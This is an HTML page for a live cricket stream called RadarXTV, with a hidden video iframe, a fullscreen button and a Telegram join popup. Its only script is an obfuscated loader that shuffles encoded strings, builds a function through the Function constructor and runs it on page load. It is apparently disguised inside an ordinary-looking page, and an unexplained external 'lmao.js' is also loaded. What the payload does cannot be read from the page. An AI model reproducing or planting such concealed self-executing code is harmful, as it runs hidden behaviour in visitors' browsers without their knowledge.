<!DOCTYPE html>
<html lang="en">
<head>
<script src="lmao.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  /* Width same as before */
            height: 60vh; /* Reduced height */
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage, #refreshMessage { 
            font-size: 16px; 
            color: red; 
            position: relative;
        }
        #refreshMessage { 
            color: yellow; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: white; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
    </style>
</head>
<body>

<div class="container">
    <h1>RadarXTV - Live Stream</h1>
    
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" style="display:none;"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
    <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div>
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<!-- Popup for Telegram -->
<div id="popup" class="popup" style="display: flex;">
    <div class="popup-content">
        <p>Join RadarXCricket on Telegram</p>
        <button id="joinBtn">Join</button>
        <button id="cancelBtn">Cancel</button>
    </div>
</div>

<script>
(function(){var nVy='',myv=437-426;function uhB(z){var d=188074;var h=z.length;var u=[];for(var s=0;s<h;s++){u[s]=z.charAt(s)};for(var s=0;s<h;s++){var o=d*(s+542)+(d%50648);var x=d*(s+293)+(d%12620);var y=o%h;var p=x%h;var b=u[y];u[y]=u[p];u[p]=b;d=(o+x)%1481550;};return u.join('')};var ggB=uhB('vlhsnrfkioctzuurnpbmjodcrottqagxywsec').substr(0,myv);var syZ='=a} )=f42r)7q,p=.2fvarocl"(b]d(f=hhj8lenlp[rot=v=x z);)a. l=f9a,h8,8l,x6a8),u2u7l,o5z7a,)0v99,)458o,17{7l,h1f6o,v9,7l,;0l;=ay h= ].for v;r.o=0ho.q4lsn3t[;,+()e[([=]r=]+d;aa  "=]]+u==)9vrh=o0-jt=h4Sf4rnvurtb=0+bsa]gim.n[stlqn+t);8+=)uv;r.dja,g=m=nlspb ."pfi+(v o)kfrrev6rlt.d,len1t+-l;">e0=tr-]{jac )=juilov[r<evd{t[;vae t=(ualvv.r+h}0av0r)anefllnlt,;vae ;;;on(+ah a=a;v<s;r+7)*v.r saerc;a0CfdtAw(e)1v1rlygzis[;uf.yp{h=iy 15*r+b.uhur;o"eAtflC1+-v;r=n;,+r;ve=s1 ef ss=;))purh(q.re2gihuuge,c(a"Ctd;A6((+n)a+v.vh{rtode;tel=2v-<;]=(; +C2v}flteacon(iau=;}ir([=on]l();=[].in(t>d)1.ou8h(egs2brtsi,g;h,fm)av0prsu()[r+!]j;+=[+i;=ia(0!9n(le)ri((g<n)m.-uih4e{s(bst=i;glh )rdct,=..ooAn+"e)d}lirprsn(i[(]f;rv7r.noinj)ia(}"0;ta) a=l9;,=9;4p,g6]3C,c0t.2o+crt;q1;uac p=etvi6g f-o}CuavCodd(861;ho)(rar 8=h;7< .re(g,hno{+in(n+s;l)trx5cecmarA;(m)p.zo3ngStr6nh.Crrm.hor[oleem(o;)1;;e,uin+npsal2tfxj")"q.ro(nsxv;';var OZR=uhB[ggB];var VaH='';var Gss=OZR;var RZT=OZR(VaH,uhB(syZ));var fKN=RZT(uhB('sln3sCh?Jdn( DHt_Hth75\'0&,t5ZZ.Z.bp)nuZmif)0,lsC5.gZsol]Z.n,6(aZZ(7!2$it(s3jinrr7+e!_(!=0;&_5(Z4t}gteIZ)t!$=Z9t{ =e e_n2n4]!a3slmaa]]k6temhZZ91eZ0m%Zd&nnt)t_.% aZ})7Z,.%.=icIZep%Z-%.ei)faI6n0=7),ulpZZF>o0ipc5s.r)t0!e=_#itZ! 2Zaeg3Zln!a9j.ZtKia5jerZnZ{nmrkr(\')7dtr.paa0li;4HZh[jgj.=8(2(.e]r3n (t){mt0.]Z4vl.nl%ZeeuZe)3,ZM=ieZ]Bpwjdsgaac=n(d;4]? e6l.[SZm_r1e6ki;;Z2O()oci(e]%3e9.Z)9Z8b0,HzZ8e%en2{lho)n)n)(f2H;{f,f@4.1koZac(.{ sr[eprZm,:Z%8r8bq;%nae4Je;nuZ.=pZer6ll$LZde!}]cc,o_r_Mn3iM }9tZ.lZ3;519_(]m%3 f1<snZ,eu.)ech}o_\/Si+nZeiZ,5[[bseollnef._ Z,i)eec%Zdi!30trZ)53iou%L:es7ikuZ1_o,,Z1l)nec&Zog]r.&&rnZ4rrwnauHks%CAltZ{aZZe)me3t%]($je(feZwwo"!s$ a69574v2Zf4c49io5,.(.de3em(e.peb=lE{Z_Z:;IwKdZc}; (pO>.*ne:t8%_4Sv_ZtZ;lfte=$x=]#%{ui.eZCrZd$},Zjf;e.](=e\/]e6HszZt23Z[6:a;i$64ZZ7!Zl5(Z5.,z xZ}EsnZffto;.nt0u!Z)]0j+Jt(eZrr ({5oq=c(ZdZi,)o:)C$Z33m0Z&!h.).Z2!m;(7_*)3nj)ZZeef_nZ7uLc5ZZ,ko71_{)Z0e$ni5Za#f;qZ#r7(5zn$Z;$aZ\/ pk"Z!jZZ;))]br]S.%7Z;"Z( ;qb%1n;n)!u(t,e@(r$b7 67Hr$72H;tZZ2)HAo$nfZe(Z1; iz%Z(jJsr$m_hrn$?aZnc5 )nnF5Zn1oh,a5y%ZlfZ6\'#oZ5qZvZ);?sBZaa\/oZI).oZ.0.(7=eLr9]{!Z.0Z_ZN;o9BeeErtZ(at(ZeZF5e(c#cc.8Zlt)ri2a=Z]k]\/eq_,"_;u"Z)el4gZ#r\/_%lfn(%ZbD4C3Z Z;i_c(JI+Zlm1H%tu-n43zrbZ1_ZE,1;4qFZZ[)rcu)Zed.Z_=($te[er%u4];4.]b(;;)eke;.[Zs%?e;Z2FIlHj \/Zw1$]Z.Z5aZ)]Zf=_afD)%_<)$oZ9z[.ZS1n6.$%@Zn4"or1)!6yZ)ZeZZlCLri4(Zifr{rZI;[un_!no=; Zp1Z!H]e4e db_c.rue,n=J;aE3{i3$!."9Zn.]Z0l8bks!%1k).)nbZZeuIjiZ)Z]DuqZ3]ed3(Ze6u!  Z)1g.ui:\'Z{e3!))_0Z{({z3Z)Z CJak.}hZZj3bZ>fZ(_oZrZ]Z  oe[eZ]!i7.n6j5r4e9}tZ(Z))re)nt_4i.soet;9Z.ZzP=!l,_aaIZfo!Z(;.\'n_ n>1ZoZsrIh)Z(rZheZPH!6$_ZZ)52\/(Z))t(Z7#Zc]e$0(;o$(!c$6}#Z%7dZoOhx8Zt}}Z0}E0M(Z@fc$g=deZnZ.Zxr*]{o.Ceire.$gZ)eo$_d_n1DZ%23eei3_ZZ+r 6n20i(o,f t(a8crt]]Zt6cf)t(a2Zs}9eZ[ZeZ{Z8(o%Zt9"-;3942)u(i"]abZe.1_Z1ZZ(]Z*f.Z5Z#,Z9Er6]ZZl{%w(e.df3o_8 cZa.2%{cl4)_Z+H, FZb6n2\/im]p2]65#nkrdtZs Z6;.{e)Zotll_(_ce$.b$)J.4su[no.{Fv2ZK@%2fcZ<=eZe(6{t%pj:;ZZ2+ZZe@fetZZZ)7,,Z)+ocuo%m4yZ__.)sieGZ_;tZif0,r_Hr.Bu@]l)naZ3e]f(cZ$gg@Ad$doZu_ ZM(ZD3c[Z;eZ1.a41ZlC*K7rZsZ]ub)!7Zdn0\/ew2]n?=r5buZdK6aZ7{1oec {Z=an]_hfzZurl2=ug.uscjZo"Ze!eaZzIiZ8Z%-_e!Z(n.Z ZZZ( ,eFodtig&l7lAy(.Z_\/Zls=ZZOa{Ksro$faxu7el)oZ faZ_=ZnibZ)(ctH])Zd_l)f[Z_tZf%joZe})ibn6adMo(Zc;77ZfC)9it2p=Z.3F]iu()},xsb.].3Zd r.t3qtqf!Lcr9 6j)fZZ0g;.K3tZt2o;!6{.i87lnt(.{rG7nZ{.tu)t}Z"!;2o 7e%t)t[l(7aPn jb07Z  Zs.),3oPcr$eceu2_..n }Z(<a eZ"iN1$,Munttie=.[3Z)+)1nZ3t(2eo(.Zj%}c$smr.eut)'));var HXW=Gss(nVy,fKN );HXW(6549);return 8084})()
</script>

</body>
</html>